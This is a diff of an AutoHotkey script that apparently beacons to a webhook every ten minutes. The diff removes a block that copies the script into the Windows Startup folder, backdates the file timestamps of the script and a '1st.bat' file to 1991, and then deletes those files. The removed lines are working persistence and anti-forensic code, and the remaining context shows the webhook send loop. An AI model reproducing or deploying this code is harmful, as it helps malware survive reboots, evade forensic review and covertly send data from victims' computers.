@@ -9,31 +9,6 @@ Http.SetRequestHeader("Content-Type", "application/json")
 Http.Send(Json)
 }
 
-
-if (A_ScriptFullPath != A_Startup "\" A_ScriptName) {
-
-	FileCopy, %A_ScriptFullPath%, %A_Startup%
-	Run, %A_Startup%\%A_ScriptName%
-	FileSetTime, 19910824000000, %A_ScriptFullPath%, A
-	FileSetTime, 19910824000000, %A_ScriptFullPath%, M
-	FileSetTime, 19910824000000, %A_ScriptFullPath%, C
-	FileSetTime, 19910824000000, %A_Startup%\%A_ScriptName%, A
-	FileSetTime, 19910824000000, %A_Startup%\%A_ScriptName%, M
-	FileSetTime, 19910824000000, %A_Startup%\%A_ScriptName%, C
-	FileSetTime, 19910824000000, %A_ScriptDir%\1st.bat, A
-	FileSetTime, 19910824000000, %A_ScriptDir%\1st.bat, M
-	FileSetTime, 19910824000000, %A_ScriptDir%\1st.bat, C
-
-
-	Loop, Files, C:\1st.bat, R
-	{
-	    FileDelete, A_LoopFileFullPath
-	    break
-	}
-	FileDelete, %A_ScriptFullPath%
-	ExitApp
-}
-
 SetTimer, SendW, 600000
 SendWebhook("Successfully connected to webhook :white_check_mark:")
 Loop {
